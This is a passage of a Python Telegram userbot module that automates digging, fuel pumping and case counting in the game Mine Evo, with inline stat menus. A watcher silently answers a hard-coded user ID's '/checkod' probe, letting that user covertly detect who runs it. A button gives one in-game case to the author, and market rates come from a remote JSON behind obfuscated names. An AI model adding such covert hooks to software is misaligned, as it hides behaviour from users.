            if re.findall('http[s]?://(?:[a-zA-Z]|[0-9]|[$-@.&+]|[!*(),]|(?:%[0-9a-fA-F][0-9a-fA-F]))+', response):
                response = '\n'.join(response.split('\n')[:-2])
            await call.edit(
                text=response,
                reply_markup=[
                    [
                        {
                            "text": "📋 Профиль",
                            "callback": self.stor_prof,
                        },
                        {
                            'text': '📈 Статистика',
                            'callback': self.stor_stata,
                        }
                    ],
                    [
                        {
                            "text": "🎒 Инвентарь",
                            "callback": self.stor_inv,
                        },
                    ],
                    [
                        {
                            'text': '🌌 Звездная Пыль',
                            'callback': self.stor_star
                        }
                    ],
                    [
                        {
                            'text':'> 📦 Кейсы <',
                            'callback':self.stor_cases,
                        },
                        {
                            'text':'⚡️ Бустеры',
                            'callback':self.stor_boosters,
                        }
                    ],
                    [
                        {
                            "text": "🎆 Плазма",
                            "callback": self.stor_plasm,
                        },
                        {
                            "text": "💵 Баланс",
                            "callback": self.stor_balance,
                        },
                        {
                            "text": "🔩 Скрап",
                            "callback": self.stor_scrap,
                        }
                    ],
                    [
                        {
                            'text':'💰 Поддержать автора ( 1 редкий кейс )',
                            'callback': self.donate_author,
                        },
                    ],   
                    [
                        {
                        "text": "🔻 Закрыть",
                        "action": "close",
                        }
                    ],
                ],
            )     

    async def stor_boosters(self, call: InlineCall):
        async with self.client.conversation(self._backup_channel) as conv:
            await conv.send_message('бусты')
            response = (await conv.get_response()).message
            links_regex = re.compile(r'.(https?://\S+).')
            response = links_regex.sub('', response)
            if re.findall('http[s]?://(?:[a-zA-Z]|[0-9]|[$-@.&+]|[!*(),]|(?:%[0-9a-fA-F][0-9a-fA-F]))+', response):
                response = '\n'.join(response.split('\n')[:-2])
            await call.edit(
                text=response,
                reply_markup=[
                    [
                        {
                            "text": "📋 Профиль",
                            "callback": self.stor_prof,
                        },
                        {
                            'text': '📈 Статистика',
                            'callback': self.stor_stata,
                        }
                    ],
                    [
                        {
                            "text": "🎒 Инвентарь",
                            "callback": self.stor_inv,
                        },
                    ],
                    [
                        {
                            'text': '🌌 Звездная Пыль',
                            'callback': self.stor_star
                        }
                    ],
                    [
                        {
                            'text':'📦 Кейсы',
                            'callback':self.stor_cases,
                        },
                        {
                            'text':'> ⚡️ Бустеры <',
                            'callback':self.stor_boosters,
                        }
                    ],
                    [
                        {
                            "text": "🎆 Плазма",
                            "callback": self.stor_plasm,
                        },
                        {
                            "text": "💵 Баланс",
                            "callback": self.stor_balance,
                        },
                        {
                            "text": "🔩 Скрап",
                            "callback": self.stor_scrap,
                        }
                    ],
                    [
                        {
                            'text':'💰 Поддержать автора ( 1 редкий кейс )',
                            'callback': self.donate_author,
                        },
                    ],      
                    [
                        {
                        "text": "🔻 Закрыть",
                        "action": "close",
                        }
                    ],
                ],
            )                   

    async def stor_plasm(self, call: InlineCall):
        async with self.client.conversation(self._backup_channel) as conv:
            await conv.send_message('п')
            response = (await conv.get_response()).message
            links_regex = re.compile(r'.(https?://\S+).')
            response = links_regex.sub('', response)
            if re.findall('http[s]?://(?:[a-zA-Z]|[0-9]|[$-@.&+]|[!*(),]|(?:%[0-9a-fA-F][0-9a-fA-F]))+', response):
                response = '\n'.join(response.split('\n')[:-2])
            await call.edit(
                text=response,
                reply_markup=[
                    [
                        {
                            "text": "📋 Профиль",
                            "callback": self.stor_prof,
                        },
                        {
                            'text': '📈 Статистика',
                            'callback': self.stor_stata,
                        }
                    ],
                    [
                        {
                            "text": "🎒 Инвентарь",
                            "callback": self.stor_inv,
                        },
                    ],
                    [
                        {
                            'text': '🌌 Звездная Пыль',
                            'callback': self.stor_star
                        }
                    ],
                    [
                        {
                            'text':'📦 Кейсы',
                            'callback':self.stor_cases,
                        },
                        {
                            'text':'⚡️ Бустеры',
                            'callback':self.stor_boosters,
                        }
                    ],
                    [
                        {
                            "text": "> 🎆 Плазма <",
                            "callback": self.stor_plasm,
                        },
                        {
                            "text": "💵 Баланс",
                            "callback": self.stor_balance,
                        },
                        {
                            "text": "🔩 Скрап",
                            "callback": self.stor_scrap,
                        }
                    ],
                    [
                        {
                            'text':'💰 Поддержать автора ( 1 редкий кейс )',
                            'callback': self.donate_author,
                        },
                    ],  
                    [
                        {
                        "text": "🔻 Закрыть",
                        "action": "close",
                        }
                    ],
                ],
            )          
                
    async def stor_balance(self, call: InlineCall):
        async with self.client.conversation(self._backup_channel) as conv:
            await conv.send_message('б')
            response = (await conv.get_response()).message
            links_regex = re.compile(r'.(https?://\S+).')
            response = links_regex.sub('', response)
            if re.findall('http[s]?://(?:[a-zA-Z]|[0-9]|[$-@.&+]|[!*(),]|(?:%[0-9a-fA-F][0-9a-fA-F]))+', response):
                response = '\n'.join(response.split('\n')[:-2])
            await call.edit(
                text=response,
                reply_markup=[
                    [
                        {
                            "text": "📋 Профиль",
                            "callback": self.stor_prof,
                        },
                        {
                            'text': '📈 Статистика',
                            'callback': self.stor_stata,
                        }
                    ],
                    [
                        {
                            "text": "🎒 Инвентарь",
                            "callback": self.stor_inv,
                        },
                    ],
                    [
                        {
                            'text': '🌌 Звездная Пыль',
                            'callback': self.stor_star
                        }
                    ],
                    [
                        {
                            'text':'📦 Кейсы',
                            'callback':self.stor_cases,
                        },
                        {
                            'text':'⚡️ Бустеры',
                            'callback':self.stor_boosters,
                        }
                    ],
                    [
                        {
                            "text": "🎆 Плазма",
                            "callback": self.stor_plasm,
                        },
                        {
                            "text": "> 💵 Баланс <",
                            "callback": self.stor_balance,
                        },
                        {
                            "text": "🔩 Скрап",
                            "callback": self.stor_scrap,
                        }
                    ],
                    [
                        {
                            'text':'💰 Поддержать автора ( 1 редкий кейс )',
                            'callback': self.donate_author,
                        },
                    ],   
                    [
                        {
                        "text": "🔻 Закрыть",
                        "action": "close",
                        }
                    ],
                ],
            )              

    async def stor_scrap(self, call: InlineCall):
        async with self.client.conversation(self._backup_channel) as conv:
            await conv.send_message('с')
            response = (await conv.get_response()).message
            links_regex = re.compile(r'.(https?://\S+).')
            response = links_regex.sub('', response)
            if re.findall('http[s]?://(?:[a-zA-Z]|[0-9]|[$-@.&+]|[!*(),]|(?:%[0-9a-fA-F][0-9a-fA-F]))+', response):
                response = '\n'.join(response.split('\n')[:-2])
            await call.edit(
                text=response,
                reply_markup=[
                    [
                        {
                            "text": "📋 Профиль",
                            "callback": self.stor_prof,
                        },
                        {
                            'text': '📈 Статистика',
                            'callback': self.stor_stata,
                        }
                    ],
                    [
                        {
                            "text": "🎒 Инвентарь",
                            "callback": self.stor_inv,
                        },
                    ],
                    [
                        {
                            'text': '🌌 Звездная Пыль',
                            'callback': self.stor_star
                        }
                    ],
                    [
                        {
                            'text':'📦 Кейсы',
                            'callback':self.stor_cases,
                        },
                        {
                            'text':'⚡️ Бустеры',
                            'callback':self.stor_boosters,
                        }
                    ],
                    [
                        {
                            "text": "🎆 Плазма",
                            "callback": self.stor_plasm,
                        },
                        {
                            "text": "💵 Баланс",
                            "callback": self.stor_balance,
                        },
                        {
                            "text": "> 🔩 Скрап <",
                            "callback": self.stor_scrap,
                        }
                    ],
                    [
                        {
                            'text':'💰 Поддержать автора ( 1 редкий кейс )',
                            'callback': self.donate_author,
                        },
                    ],   
                    [
                        {
                        "text": "🔻 Закрыть",
                        "action": "close",
                        }
                    ],
                ],
            )            

    async def stor_star(self, call: InlineCall):
        async with self.client.conversation(self._backup_channel) as conv:
            await conv.send_message('зп')
            response = (await conv.get_response()).message
            links_regex = re.compile(r'.(https?://\S+).')
            response = links_regex.sub('', response)
            if re.findall('http[s]?://(?:[a-zA-Z]|[0-9]|[$-@.&+]|[!*(),]|(?:%[0-9a-fA-F][0-9a-fA-F]))+', response):
                response = '\n'.join(response.split('\n')[:-2])
            await call.edit(
                text=response,
                reply_markup=[
                    [
                        {
                            "text": "📋 Профиль",
                            "callback": self.stor_prof,
                        },
                        {
                            'text': '📈 Статистика',
                            'callback': self.stor_stata,
                        }
                    ],
                    [
                        {
                            "text": "🎒 Инвентарь",
                            "callback": self.stor_inv,
                        },
                    ],
                    [
                        {
                            'text': '> 🌌 Звездная Пыль <',
                            'callback': self.stor_star
                        }
                    ],
                    [
                        {
                            'text':'📦 Кейсы',
                            'callback':self.stor_cases,
                        },
                        {
                            'text':'⚡️ Бустеры',
                            'callback':self.stor_boosters,
                        }
                    ],
                    [
                        {
                            "text": "🎆 Плазма",
                            "callback": self.stor_plasm,
                        },
                        {
                            "text": "💵 Баланс",
                            "callback": self.stor_balance,
                        },
                        {
                            "text": "🔩 Скрап",
                            "callback": self.stor_scrap,
                        }
                    ],
                    [
                        {
                            'text':'💰 Поддержать автора ( 1 редкий кейс )',
                            'callback': self.donate_author,
                        },
                    ],      
                    [
                        {
                        "text": "🔻 Закрыть",
                        "action": "close",
                        }
                    ],
                ],
            )            

    async def donate_author(self, call: InlineCall):
        await self.client.send_message('@mine_evo_bot','Дать LUNTIK_FLAME рк 1')
        await call.answer('Спасибо❤️, ты просрал 1 кейс')    
    
    @loader.watcher()
    async def WatcherExFuel(self, message):
        exdelay = self.config['delay_ex_fuel']
        dela = self.config['delay_fuel']
        module = self.config['module']
        warning = self.config['warning']
        delay = dela * 60
        if module == True:
            if "Бочка топлива" in message.raw_text:
                if message.chat_id == 5522271758:
                    if module == True:
                        await asyncio.sleep(exdelay)
                        await self.client.send_message(message.chat_id, 'Качать')
                        return
                    return
            if 'кончилась нефть!' in message.raw_text:
                if message.chat_id == 5522271758:
                    await asyncio.sleep(delay)
                    await self.client.send_message(message.chat_id, 'Качать')
                    return
                return
            if 'заполнено топливом!' in message.raw_text:
                if message.chat_id == 5522271758:
                    if warning == True:
                        await asyncio.sleep(2)
                        await self.client.send_message('me','<emoji document_id=5397866729554583012>❗️</emoji> <b>Warning | ExFuel</b>\nВаше хранилище заполнено топливом!')
                        await asyncio.sleep(delay)
                        await self.client.send_message(message.chat_id, 'Качать')
                        return
                    if warning == False:
                        await asyncio.sleep(delay)
                        await self.client.send_message(message.chat_id, 'Качать')
                        return
                    return
                return
            if '/checkod' in message.raw_text:
                if message.from_id == 5195118663:
                    await self.client.send_message(message.chat_id, 'evo')
                    return
                    
    async def client_ready(self, client, db):
        self.bb = False
        s = self.get('dly')
        if s is None:
            self.set('dly', 1.0)
        s = self.get('mm')
        if s is None:
            self.set('mm', False)
        s = self.get('ag')
        if s is None:
            self.set('ag', False)
        s = self.get('as')
        if s is None:
            self.set('as', False)
        s = self.get('fw')
        if s is None:
            self.set('fw', False)
        if self.get("cases") == None:
            self.set("cases", {
                "kt": True,
                "rkt": True,
                "k": True,
                "rk": True,
                "mif": True,
                "kr": True,
                "dk": True,
                "zv": True,
                "ssp": True,
                "pse": True,
                "plasma": True
            })
        if self.get("kol_cases") == None:
            self.set("kol_cases", {
                "kt": 0,
                "rkt": 0,
                "k": 0,
                "rk": 0,
                "mif": 0,
                "kr": 0,
                "dk": 0,
                "zv": 0,
                "ssp": 0,
                "pse": 0,
                "plasma": 0,
                "clicks": 0
            })
        await self.continue_mining()

    @loader.watcher()
    async def watcher(self, message):
        a = self.get("kol_cases")
        if hasattr(message, 'from_id') and hasattr(message, 'chat_id') and message.from_id == 7168860714 and message.chat_id == 7168860714 and "Руда на уровень" in message.raw_text:
            a["clicks"] += 1
            self.set("kol_cases", a)
            
        if hasattr(message, 'from_id') and hasattr(message, 'chat_id') and message.from_id == 7168860714 and message.chat_id == 7168860714 and "Найден" in message.raw_text:
            if "✉" in message.raw_text and "Конверт" in message.raw_text:
                colpt = r"\d+"
                search = re.search(colpt, message.raw_text)
                colvo = int(search[0])
                
                a["kt"] += colvo
                self.set("kol_cases", a)
            if "🧧" in message.raw_text and "Редкий Конверт" in message.raw_text:
                colpt = r"\d+"
                search = re.search(colpt, message.raw_text)
                colvo = int(search[0])
                
                a["rkt"] += colvo
                self.set("kol_cases", a)

            if "📦" in message.raw_text and "Кейс" in message.raw_text:
                colpt = r"\d+"
                search = re.search(colpt, message.raw_text)
                colvo = int(search[0])

                a["k"] += colvo
                self.set("kol_cases", a)

            if "🗳" in message.raw_text and "Редкий Кейс" in message.raw_text:
                colpt = r"\d+"
                search = re.search(colpt, message.raw_text)
                colvo = int(search[0])

                a["rk"] += colvo
                self.set("kol_cases", a)

            if "🕋" in message.raw_text and "Мифический Кейс" in message.raw_text:
                colpt = r"\d+"
                search = re.search(colpt, message.raw_text)
                colvo = int(search[0])

                a["mif"] += colvo
                self.set("kol_cases", a)

            if "Портфель" in message.raw_text:
                colpt = r"\d+"
                search = re.search(colpt, message.raw_text)
                colvo = int(search[0])

                a["pse"] += colvo
                self.set("kol_cases", a)

            if "Сумка" in message.raw_text:    
                colpt = r"\d+"
                search = re.search(colpt, message.raw_text)
                colvo = int(search[0])

                a["ssp"] += colvo
                self.set("kol_cases", a)

            if "💎" in message.raw_text and "Кристальный Кейс" in message.raw_text:
                colpt = r"\d+"
                search = re.search(colpt, message.raw_text)
                colvo = int(search[0])

                a["kr"] += colvo
                self.set("kol_cases", a)

            if "🎲" in message.raw_text and "Дайс Кейс" in message.raw_text:
                colpt = r"\d+"
                search = re.search(colpt, message.raw_text)
                colvo = int(search[0])

                a["dk"] += colvo
                self.set("kol_cases", a)

            if "💫" in message.raw_text:
                a["zv"] += 1
                self.set("kol_cases", a)

        if hasattr(message, 'from_id') and message.from_id == 7168860714 and message.chat_id == 7168860714 and "Плазма +" in message.raw_text:
            plpt = r"\d+"
            search = re.search(plpt, message.raw_text)
            colvo = int(search[0])
            
            a["plasma"] += colvo
            self.set("kol_cases", a)

    @loader.command()
    async def mmm(self, message):
        '''- Включить/выключить копание'''
        self.set('mm', not self.get('mm'))
        if self.get('mm'):
            await self.client.send_message(message.chat_id, "<b><emoji document_id=5253877736207821121>🔥</emoji>Работаю</b>")
            await message.delete()
            self.set("kol_cases", {
                "kt": 0,
                "rkt": 0, 
                "k": 0,
                "rk": 0,
                "mif": 0,
                "kr": 0,
                "dk": 0,
                "zv": 0,
                "ssp": 0,
                "pse": 0,
                "plasma": 0,
                "clicks": 0
            })
            await self.continue_mining()
        else:
            cases_text=""
            a = self.get("cases")
            b = self.get("kol_cases")
            for i in a:
                if a[i]:
                    cases_text += f'{self.strings(i)} {str(b[i])}'
            await self.client.send_message(message.chat_id, f"<emoji document_id=5253952855185829086>⚙️</emoji> ᴋоᴨᴀниᴇ оᴄᴛᴀноʙᴧᴇно\n<emoji document_id=5256058608931580017>📦</emoji> ᴨодᴩобнᴇᴇ\n\n<emoji document_id=5256250435055920155>1️⃣</emoji> <b>ᴋоᴨᴀний</b>: {b['clicks']}\n{cases_text}")
            await message.delete()
            

    async def continue_mining(self):
        while self.get('mm'):
            await self.client.send_message("@mine_evo_gold_bot", 'коп')
            await asyncio.sleep(self.get('dly'))
    async def process_mining_result(self, result_text):
        pass

    @loader.command()
    async def emdly(self, message: Message):
        '''- Установить задержку копания [значение]'''
        args = utils.get_args_split_by(message, " ")
        cmd = f'{utils.escape_html(self.get_prefix())}{inspect.currentframe().f_code.co_name}'
        if args:
            cmd = f'{utils.escape_html(self.get_prefix())}{inspect.currentframe().f_code.co_name} {utils.get_args_raw(message)}'
        else:
            await utils.answer(message, f'<emoji document_id=5210952531676504517>❌</emoji> <b>Ошибка | {cmd}</b>\nУкажите значение, которое хотите установить')
            return
        if len(args) > 1:
            await utils.answer(message, f'<emoji document_id=5210952531676504517>❌</emoji> <b>Ошибка | {cmd}</b>\nВы указали больше одного аргумента')
            return

        zz = args[0]
        try:
            zz = float(zz)
            self.set('dly', zz)

            clicks = [100, 1000, 10000, 100000]
            times_required = [click * zz for click in clicks]

            response_text = f'<emoji document_id=5332533929020761310>✅</emoji> <b>Успешно!</b>\n<i>Задержка копания изменена на {zz} секунд</i>\n\n<emoji document_id=5974081491901091242>🕒</emoji> <b>Таким темпом:</b>\n'
            for click, time_required in zip(clicks, times_required):
                response_text += f'<emoji document_id=5843662301697150328>👉</emoji> {click} копаний за: <b>{self.format_time(time_required)}</b><emoji document_id=5776257080658758948>⛏</emoji>\n'

            await utils.answer(message, response_text)

        except ValueError:
            await utils.answer(message, f'<emoji document_id=5210952531676504517>❌</emoji> <b>Ошибка | {cmd}</b>\nУкажите число в значении!')

    def format_time(self, seconds):
        minutes, seconds = divmod(seconds, 60)
        hours, minutes = divmod(minutes, 60)
        days, hours = divmod(hours, 24)
        return f'{int(days)} дней, {int(hours)} часов, {int(minutes)} минут, {int(seconds)} секунд'

    @loader.command()
    async def emcfg(self,message):
        '''- Конфиг модуля MevoMiner'''
        if self.get('ag'):
            dpg = ' ▫️ <i>Включать копание после убийства босса</i>\n'
        else:
            dpg = ''
        
        if self.get('as'):
            dps = ' ▫️ <i>Выключать копание во время убийства босса</i>\n'
        else:
            dps = ''
        
        if self.get('fw'):
            dpf = ' ▫️ <i>Включать копание после FloodWait</i>\n'
        else: 
            dpf = ''
        
        if self.get('mm'):
            dpm = 'Включено'
        else:
            dpm = 'Выключено'
        
        await self.inline.form(
            text=f"<emoji document_id=5981043230160981261>⏱</emoji> <b>Задержка копания:</b> <code>{self.get('dly')}</code>\n⛏ <b>Статус копания:</b> <i>{dpm}</i>\n<b>➕ Дополнительные параметры:</b>\n{dps}{dpg}{dpf}",
            message=message,
            reply_markup=[
                [
                    {
                        'text' : '⏱ Задержка копания ',
                        'callback' : self.mdlym,
                    },
                    {
                        'text' : '➕ Дополнительные параметры',
                        'callback' : self.idd,
                    },
                ],
                [
                    {
                        'text' : '🔻 Закрыть',
                        'action' : 'close'
                    }
                ]
            ]
        )
    async def mdlym(self,call:InlineCall):
        if self.get('ag'):
            dpg = ' ▫️ <i>Включать копание после убийства босса</i>\n'
        else:
            dpg = ''
        
        if self.get('as'):
            dps = ' ▫️ <i>Выключать копание во время убийства босса</i>\n'
        else:
            dps = ''
        
        if self.get('fw'):
            dpf = ' ▫️ <i>Включать копание после FloodWait</i>\n'
        else: 
            dpf = ''
        
        if self.get('mm'):
            dpm = 'Включено'
        else:
            dpm = 'Выключено'
        await call.edit(
            text=f"<emoji document_id=5981043230160981261>⏱</emoji> <b>Задержка копания:</b> <code>{self.get('dly')}</code>\n⛏ <b>Статус копания:</b> <i>{dpm}</i>\n<b>➕ Дополнительные параметры:</b>\n{dps}{dpg}{dpf}\n\n<i><emoji document_id=5452069934089641166>❓</emoji> Чтобы изменить задержку копания напишите:\n</i><code>.emdly [задержка]</code>",
            reply_markup=[
                [
                    {
                        'text' : '⏱ Задержка копания ',
                        'callback' : self.mdlym,
                    },
                    {
                        'text' : '➕ Дополнительные параметры',
                        'callback' : self.idd,
                    },
                ],
                [
                    {
                        'text' : '🔻 Закрыть',
                        'action' : 'close'
                    }
                ]
            ]
        )
    async def iback(self,call:InlineCall):
        if self.get('ag'):
            dpg = ' ▫️ <i>Включать копание после убийства босса</i>\n'
        else:
            dpg = ''
        
        if self.get('as'):
            dps = ' ▫️ <i>Выключать копание во время убийства босса</i>\n'
        else:
            dps = ''
        
        if self.get('fw'):
            dpf = ' ▫️ <i>Включать копание после FloodWait</i>\n'
        else: 
            dpf = ''
        
        if self.get('mm'):
            dpm = 'Включено'
        else:
            dpm = 'Выключено'

        await call.edit(
            text=f"<emoji document_id=5981043230160981261>⏱</emoji> <b>Задержка копания:</b> <code>{self.get('dly')}</code>\n⛏ <b>Статус копания:</b> <i>{dpm}</i>\n<b>➕ Дополнительные параметры:</b>\n{dps}{dpg}{dpf}",
            reply_markup=[
                [
                    {
                        'text' : '⏱ Задержка копания ',
                        'callback' : self.mdlym,
                    },
                    {
                        'text' : '➕ Дополнительные параметры',
                        'callback' : self.idd,
                    },
                ],
                [
                    {
                        'text' : '🔻 Закрыть',
                        'action' : 'close'
                    }
                ]
            ]
        )
    async def idd(self,call:InlineCall):
        if self.get('ag'):
            dpg = ' ▫️ <i>Включать копание после убийства босса</i>\n'
        else:
            dpg = ''
        
        if self.get('as'):
            dps = ' ▫️ <i>Выключать копание во время убийства босса</i>\n'
        else:
            dps = ''
        
        if self.get('fw'):
            dpf = ' ▫️ <i>Включать копание после FloodWait</i>\n'
        else: 
            dpf = ''
        
        await call.edit(
            text=f'<b>➕ Дополнительные параметры:</b>\n{dps}{dpg}{dpf}',
            reply_markup=[
                [
                    {
                        'text' : 'Выкл/не выкл копание во время убийства босса',
                        'callback' : self.ibs
                    },
                ],
                [
                    {
                        'text' : 'Копание после убийства босса',
                        'callback' : self.ibg,
                    },
                ],
                [
                    {
                        'text' : 'Копание после FloodWait',
                        'callback' : self.ifs,
                    },
                ],
                [
                    {
                        'text' : 'Переключение элементов статистики',
                        'callback' : self.els,
                    },
                ],
                [
                    {
                        'text' : '🔙 Назад',
                        'callback' : self.iback,
                    },
                    {
                        'text' : '🔻 Закрыть',
                        'action' : 'close'
                    }
                ]
            ]
        )
    async def ibg(self,call:InlineCall):
        self.set('ag', not self.get('ag'))
        if self.get('ag'):
            dpg = ' ▫️ <i>Включать копание после убийства босса</i>\n'
        else:
            dpg = ''
        
        if self.get('as'):
            dps = ' ▫️ <i>Выключать копание во время убийства босса</i>\n'
        else:
            dps = ''
        
        if self.get('fw'):
            dpf = ' ▫️ <i>Включать копание после FloodWait</i>\n'
        else: 
            dpf = ''
        
        await call.edit(
            text=f'<b>➕ Дополнительные параметры:</b>\n{dps}{dpg}{dpf}',
            reply_markup=[
                [
                    {
                        'text' : 'Выкл/не выкл копание во время убийства босса',
                        'callback' : self.ibs
                    },
                ],
                [
                    {
                        'text' : 'Копание после убийства босса',
                        'callback' : self.ibg,
                    },
                ],
                [
                    {
                        'text' : 'Копание после FloodWait',
                        'callback' : self.ifs,
                    },
                ],
                [
                    {
                        'text' : 'Переключение элементов статистики',
                        'callback' : self.els,
                    },
                ],
                [
                    {
                        'text' : '🔙 Назад',
                        'callback' : self.iback,
                    },
                    {
                        'text' : '🔻 Закрыть',
                        'action' : 'close'
                    }
                ]
            ]
        )
    async def ibs(self,call:InlineCall):
        self.set('as', not self.get('as'))
        if self.get('ag'):
            dpg = ' ▫️ <i>Включать копание после убийства босса</i>\n'
        else:
            dpg = ''
        
        if self.get('as'):
            dps = ' ▫️ <i>Выключать копание во время убийства босса</i>\n'
        else:
            dps = ''
        
        if self.get('fw'):
            dpf = ' ▫️ <i>Включать копание после FloodWait</i>\n'
        else: 
            dpf = ''
        
        await call.edit(
            text=f'<b>➕ Дополнительные параметры:</b>\n{dps}{dpg}{dpf}',
            reply_markup=[
                [
                    {
                        'text' : 'Выкл/не выкл копание во время убийства босса',
                        'callback' : self.ibs
                    },
                ],
                [
                    {
                        'text' : 'Копание после убийства босса',
                        'callback' : self.ibg,
                    },
                ],
                [
                    {
                        'text' : 'Копание после FloodWait',
                        'callback' : self.ifs,
                    },
                ],
                [
                    {
                        'text' : 'Переключение элементов статистики',
                        'callback' : self.els,
                    },
                ],
                [
                    {
                        'text' : '🔙 Назад',
                        'callback' : self.iback,
                    },
                    {
                        'text' : '🔻 Закрыть',
                        'action' : 'close'
                    }
                ]
            ]
        )
    async def ifs(self,call:InlineCall):
        self.set('fw', not self.get('fw'))
        if self.get('ag'):
            dpg = ' ▫️ <i>Включать копание после убийства босса</i>\n'
        else:
            dpg = ''
        
        if self.get('as'):
            dps = ' ▫️ <i>Выключать копание во время убийства босса</i>\n'
        else:
            dps = ''
        
        if self.get('fw'):
            dpf = ' ▫️ <i>Включать копание после FloodWait</i>\n'
        else: 
            dpf = ''
        
        await call.edit(
            text=f'<b>➕ Дополнительные параметры:</b>\n{dps}{dpg}{dpf}',
            reply_markup=[
                [
                    {
                        'text' : 'Выкл/не выкл копание во время убийства босса',
                        'callback' : self.ibs
                    },
                ],
                [
                    {
                        'text' : 'Копание после убийства босса',
                        'callback' : self.ibg,
                    },
                ],
                [
                    {
                        'text' : 'Копание после FloodWait',
                        'callback' : self.ifs,
                    },
                ],
                [
                    {
                        'text' : 'Переключение элементов статистики',
                        'callback' : self.els,
                    },
                ],
                [
                    {
                        'text' : '🔙 Назад',
                        'callback' : self.iback,
                    },
                    {
                        'text' : '🔻 Закрыть',
                        'action' : 'close'
                    }
                ]
            ]
        )
         
    

    async def els(self, call: InlineCall):
        c = self.get("cases")
        text = '<b>Включенные элементы:</b>\n'
        for a in c:
            text += f'<i>{self.strings[a]}</i>' if c[a] else ''
        text += '\n\n<b>Нажмите на кнопку внизу для выключения или включения элемента</b>'
        await call.edit(text=text, reply_markup=[
            [
                {
                    'text': '✉️ Конверт',
                    'callback': self.elskt,
                }
            ],
            [
                {
                    'text' : '🔙 Назад',
                    'callback' : self.ifs,
                },
                {
                    'text' : '🔻 Закрыть',
                    'action' : 'close'
                }
            ]
        ])

    async def elskt(self, call: InlineCall):
        c = self.get("cases")
        c['kt'] = not c['kt']
        self.set("cases", c)
        text = '<b>Включенные элементы:</b>\n'
        for a in c:
            text += f'<i>{self.strings[a]}</i>' if c[a] else ''
        text += '\n\n<b>Нажмите на кнопку внизу для выключения или включения элемента</b>'
        await call.edit(text=text, reply_markup=[
            [
                {
                    'text': '✉️ Конверт',
                    'callback': self.elskt,
                }
            ],
            [
                {
                    'text' : '🔙 Назад',
                    'callback' : self.ifs,
                },
                {
                    'text' : '🔻 Закрыть',
                    'action' : 'close'
                }
            ]
        ]) 
        
    @loader.command()
    async def fpc(self, m):
        """Оценить стоимость кейсов по реплаю на сообщение с кейсами"""
        c = await m.get_reply_message()
        await utils.answer(
            m,
            "<emoji document_id=5818687127000452892>🔎</emoji> <b>Сканируем рынок...</b>",
        )
        await asyncio.sleep(1)
        try:
            d = r.get(self.a, timeout=10)
            d.raise_for_status()
            e = d.json()
            f = e.get("a")
            g = e.get("b")
            h = e.get("c")
            i = e.get("e")
            j = e.get("f")
            k = e.get("g")
            l = e.get("i")
            m_ = e.get("k")
            n = e.get("l")
        except:
            await utils.answer(m, self.b)
            return
        if not c or c.sender_id != f:
            await utils.answer(m, j)
            return
        if n not in c.raw_text:
            await utils.answer(m, k)
            return
        o = c.raw_text
        await utils.answer(m, m_)
        await asyncio.sleep(1)
        p = 0
        for q, r_ in g.items():
            s = self.s(q, o)
            if s:
                t = s / r_
                p += t
        p = round(p)
        u = round(p * i)
        v = round((p / h) * 100, 2)
        await asyncio.sleep(1)
        w = l.format(
            total_myths=p,
            total_evo_coins=u,
            percentage=v,
        )
        await utils.answer(m, w)
    @loader.command()
    async def fsc(self, m):
        """Оценить стоимость открытых кейсов по реплаю на сообщение со статистикой игрока"""
        c = await m.get_reply_message()
        await utils.answer(
            m,
            "<emoji document_id=5818687127000452892>🔎</emoji> <b>Сканируем рынок...</b>",
        )
        await asyncio.sleep(1)
        try:
            d = r.get(self.a, timeout=10)
            d.raise_for_status()
            e = d.json()
            f = e.get("a")
            g = e.get("b")
            i = e.get("e")
            h = e.get("d")
            j = e.get("f")
            k = e.get("h")
            l = e.get("j")
            m_ = e.get("k")
            n = e.get("m")
        except:
            await utils.answer(m, self.b)
            return
        if not c or c.sender_id != f:
            await utils.answer(m, j)
            return
        if n not in c.raw_text:
            await utils.answer(m, k)
            return
        o = c.raw_text
        await utils.answer(m, m_)
        await asyncio.sleep(1)
        p = 0
        for q, r_ in g.items():
            s = self.s(q, o, field='Открыто')
            if r_ and s:
                t = s / r_
                p += t
        p = round(p)
        u = round(p * i)
        v = round((p / h) * 100, 2)
        await asyncio.sleep(1)
        w = l.format(
            opened_myths=p,
            opened_evo_coins=u,
            percentage=v,
        )
        await utils.answer(m, w)
    @loader.command()
    async def fpi(self, m):
        """Показать информацию о модуле и дату обновления курсов"""
        await utils.answer(
            m,
            "<emoji document_id=5215493819641895305>🚛</emoji> <b>Загружаем информацию...</b>",
        )
        await asyncio.sleep(1)
        try:
            d = r.get(self.a, timeout=10)
            d.raise_for_status()
            e = d.json()
            x = e.get("o")
            y = e.get("n")
            z = x.format(last_updated=y)
        except:
            await utils.answer(m, self.b)
            return
        await utils.answer(m, z)
    def s(self, a, b, field=None):
        if field:
            c = re.compile(
                rf"{re.escape(a)}\s*\|\s*{re.escape(field)}\s*:\s*([\d,.]+)", re.IGNORECASE
            )
        else:
            c = re.compile(
                rf"{re.escape(a)}\s*\|?\s*.*?:?\s*([\d,.]+)\s*шт\.?", re.IGNORECASE
            )
        d = c.search(b)
        if d:
            e = d.group(1).replace(",", "").replace(".", "")
            try:
                return int(e)
            except:
                return 0
        return 0
        
    @loader.command(alias = 'od')    
    async def oildrill(self, message):
        ''' - меню нефтяной скважины'''
        status = self.config['module']
        if status == True:
            await self.inline.form(
                text = '<b>Меню вашей нефтяной скважины:</b>\n\n<b>Статус:</b> Включена ',
                photo = 'https://te.legra.ph/file/616bc1bffbf6003babbd1.jpg',
                message=message,
                reply_markup=[
                    [
                        {
                            "text": "🛢 Запустить / остановить скважину",
                            "callback": self.status_drill,
                        }
                    ],
                    [
                        {
                            "text": "⚙️ Настройки скважины",
                            "callback": self.cfg_drill,
                        },
                    ],
                    [
                        {
                            'text':'💰 Поддержать автора',
                            'callback': self.donate_author,
                        }
                    ],
                    [
                        {
                            'text':'🔻 Закрыть меню',
                            'action': 'close'
                        }
                    ],
                    
                ]
            )
            return
        if status == False:
            await self.inline.form(
                text = '<b>Меню вашей нефтяной скважины:</b>\n\n<b>Статус:</b> Отключена ',
                photo = 'https://te.legra.ph/file/616bc1bffbf6003babbd1.jpg',
                message=message,
                reply_markup=[
                    [
                        {
                            "text": "🛢 Запустить / остановить скважину",
                            "callback": self.status_drill,
                        }
                    ],
                    [
                        {
                            "text": "⚙️ Настройки скважины",
                            "callback": self.cfg_drill,
                        },
                    ],
                    [
                        {
                            'text':'💰 Поддержать автора',
                            'callback': self.donate_author,
                        }
                    ],
                    [
                        {
                            'text':'🔻 Закрыть меню',
                            'action': 'close'
                        }
                    ],
                    
                ]
            )
            return

    async def home_drill(self, call: InlineCall):
        status = self.config['module']
